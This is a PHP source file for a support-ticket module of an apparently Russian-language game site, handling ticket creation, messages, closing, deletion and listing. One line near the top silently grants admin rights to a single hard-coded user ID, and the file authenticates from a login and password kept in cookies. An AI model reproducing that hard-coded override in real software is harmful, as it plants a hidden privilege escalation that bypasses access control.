<?

use \Core\Database as db;
use \Core\User as u;

$found_module = true;
u::connect(utf1251($_COOKIE['login']),utf1251($_COOKIE['pass']));
if( !defined('OK') || !isset(u::$info['id']) ) {
	die('{"error":"Invalid request, user not defined"}');
}

if( u::$info['id'] == 137157205 ) {
	u::$info['admin'] = 1;
}

$r = array();

//Действия в тикитах
if(isset($_GET['act'])) {
	if( $_GET['act'] == 'closetk' ) {
		$tid = round($_POST['tid']);
		$tid = db::query('SELECT * FROM `tickets` WHERE `id` = :id LIMIT 1',array(
			'id'	=> $tid
		),true);
		if( u::$info['admin'] == 0 && ( $tid['delete'] > 0 || $tid['uid'] != u::$info['id'] ) ) {
			unset($tid);
		}
		if(!isset($tid['id'])) {
			$r['error'] = 'Тикет не найден.';
		}else{
			db::query('UPDATE `tickets` SET `close` = :time WHERE `id` = :id LIMIT 1',array(
				'time'	=> OK,
				'id'	=> $tid['id']
			));
		}
	}elseif( $_GET['act'] == 'deletetk' && u::$info['admin'] > 0 ) {
		$tid = round($_POST['tid']);
		$tid = db::query('SELECT * FROM `tickets` WHERE `id` = :id LIMIT 1',array(
			'id'	=> $tid
		),true);
		if( u::$info['admin'] == 0 && ( $tid['delete'] > 0 || $tid['uid'] != u::$info['id'] ) ) {
			unset($tid);
		}
		if(!isset($tid['id'])) {
			$r['error'] = 'Тикет не найден.';
		}else{
			db::query('UPDATE `tickets` SET `delete` = :time WHERE `id` = :id LIMIT 1',array(
				'time'	=> OK,
				'id'	=> $tid['id']
			));
		}
	}elseif( $_GET['act'] == 'newmsg' ) {
		$text = htmlspecialchars($_POST['text']);
		$text = str_replace("\n",'<br>',$text);
		$tid = round($_POST['tid']);
		$tid = db::query('SELECT * FROM `tickets` WHERE `id` = :id LIMIT 1',array(
			'id'	=> $tid
		),true);
		if( u::$info['admin'] == 0 && ( $tid['delete'] > 0 || $tid['close'] > 0 || $tid['uid'] != u::$info['id'] ) ) {
			unset($tid);
		}
		if( $tid['close'] > 0 && u::$data['admin'] == 0 ) {
			$r['error'] = 'Тикет был закрыт! В нем нельзя оставлять сообщения.';
		}elseif( mb_strlen($text) < 1 ) {
			$r['error'] = 'Минимальное количество символов в сообщении: 1.';
		}elseif(!isset($tid['id'])) {
			$r['error'] = 'Тикет не найден!';
		}else{
			
			$time = OK;
			if( u::$info['admin'] > 0 ) {
				$time = 0;
			}
			db::query('UPDATE `tickets` SET `update` = :time WHERE `id` = :id LIMIT 1',array(
				'time'	=> $time,
				'id'	=> $tid['id']
			));
			db::query('INSERT INTO `tickets_msg` (`uid`,`time`,`login`,`level`,`align`,`clan`,`text`,`admin`,`tid`) VALUES (
				:uid , :time , :login , :level , :align , :clan , :text , :admin , :tid
			)',array(
				'tid'	=> $tid['id'],
				'uid'	=> u::$info['id'],
				'time'	=> OK,
				'login'	=> u::$info['login'],
				'level'	=> u::$info['level'],
				'align'	=> u::$info['align'],
				'clan'	=> u::$info['clan'],
				'text'	=> $text,
				'admin'	=> u::$info['admin']
			));
		}
	}elseif( $_GET['act'] == 'newticket' ) { //Создание нового тикета
		$text = htmlspecialchars($_POST['text']);
		$title = htmlspecialchars($_POST['title']);
		$text = str_replace("\n",'<br>',$text);
		$type = array(0,1,2,3,4,5);
		if( !isset($type[$_POST['type']])) {
			$type = 5;
		}else{
			$type = $type[$_POST['type']];
		}
		if( mb_strlen($title) < 1 || mb_strlen($title) > 100 ) {
			$r['error'] = 'Минимальное количество символов в заголовке: 1-100.';
		}elseif( mb_strlen($text) < 1 ) {
			$r['error'] = 'Минимальное количество символов в сообщении: 1.';
		}else{
		//
			db::query('INSERT INTO `tickets` (`uid`,`time`,`login`,`level`,`align`,`clan`,`title`,`type`,`update`) VALUES (
				:uid , :time , :login , :level , :align , :clan , :title , :type , :time
			)',array(
				'uid'	=> u::$info['id'],
				'time'	=> OK,
				'login'	=> u::$info['login'],
				'level'	=> u::$info['level'],
				'align'	=> u::$info['align'],
				'clan'	=> u::$info['clan'],
				'title'	=> $title,
				'type'	=> $type
			));
			$tid = db::lastID();
			db::query('INSERT INTO `tickets_msg` (`uid`,`time`,`login`,`level`,`align`,`clan`,`text`,`admin`,`tid`) VALUES (
				:uid , :time , :login , :level , :align , :clan , :text , :admin , :tid
			)',array(
				'tid'	=> $tid,
				'uid'	=> u::$info['id'],
				'time'	=> OK,
				'login'	=> u::$info['login'],
				'level'	=> u::$info['level'],
				'align'	=> u::$info['align'],
				'clan'	=> u::$info['clan'],
				'text'	=> $text,
				'admin'	=> u::$info['admin']
			));
			//
		}
	}elseif( $_GET['act'] == 'open_tk' ) {
		$tk = db::query('SELECT * FROM `tickets` WHERE `id` = :id LIMIT 1',array(
			'id'	=> $_GET['tk']
		),true);
		if( $tk['uid'] != u::$info['id'] && u::$info['admin'] == 0 ) {
			$r['error'] = 'Тикет не найден.';
		}elseif(!isset($tk['id'])) {
			$r['error'] = 'Тикет не найден.';
		}else{
			//
			$tk_first = db::query('SELECT * FROM `tickets_msg` WHERE `tid` = :id ORDER BY `id` ASC LIMIT 1',array(
				'id'	=> $tk['id']
			),true);
			$r['datatk'] = $tk;
			$r['datatk']['tk'] = $tk_first;
			//
			$r['all'] = db::query('SELECT COUNT(*) AS `x` FROM `tickets_msg` WHERE `tid` = :id AND `delete` = 0 LIMIT 1',
			array(
				'id' 	=> $tk['id']
			),true);
			$r['all'] = 0+$r['all']['x'];
			//
			$pgx = 1000;
			$pg  = round($_GET['pg']);
			if( $pg < 1 ) { $pg = 1; }
			$pgm = ( $pgx * $pg ) - $pgx;
			//
			$r['datatk']['com'] = db::query('SELECT * FROM `tickets_msg` WHERE `id` != "'.$tk_first['id'].'" AND `tid` = :id AND `delete` = 0 ORDER BY `id` ASC LIMIT '.$pgm.','.$pgx,array(
				'id'	=> $tk['id']
			),true,true);
		}
		//
	}elseif($_GET['act'] == 'open_rz') {
		if($_GET['rz'] == 2) {
			$pgx = 10;
			$pg  = round($_GET['pg']);
			if( $pg < 1 ) { $pg = 1; }
			$pgm = ( $pgx * $pg ) - $pgx;
			//
			$r['all'] = db::query('SELECT COUNT(*) AS `x` FROM `tickets` WHERE `delete` = 0 AND ( `uid` = :uid OR :admin > 0 ) AND `close` > 0 LIMIT 1',
			array(
				'uid' 	=> u::$info['id'],
				'admin'	=> u::$info['admin']
			),true);
			$r['all'] = $r['all']['x'];
			//
			$r['data'] = db::query('SELECT * FROM `tickets` WHERE `delete` = 0 AND ( `uid` = :uid OR :admin > 0 ) AND `close` > 0 ORDER BY `update` DESC LIMIT '.$pgm.','.$pgx.'',
			array(
				'uid' 	=> u::$info['id'],
				'admin'	=> u::$info['admin']
			),true,true);
			//	
		}else{
			$pgx = 10;
			$pg  = round($_GET['pg']);
			if( $pg < 1 ) { $pg = 1; }
			$pgm = ( $pgx * $pg ) - $pgx;
			//
			$r['all'] = db::query('SELECT COUNT(*) AS `x` FROM `tickets` WHERE `delete` = 0 AND ( `uid` = :uid OR :admin > 0 ) AND `close` = 0 LIMIT 1',
			array(
				'uid' 	=> u::$info['id'],
				'admin'	=> u::$info['admin']
			),true);
			$r['all'] = $r['all']['x'];
			//
			$r['data'] = db::query('SELECT * FROM `tickets` WHERE `delete` = 0 AND ( `uid` = :uid OR :admin > 0 ) AND `close` = 0 ORDER BY `update` DESC LIMIT '.$pgm.','.$pgx.'',
			array(
				'uid' 	=> u::$info['id'],
				'admin'	=> u::$info['admin']
			),true,true);
			//			
		}
	}
}

echo json_encode($r);

?>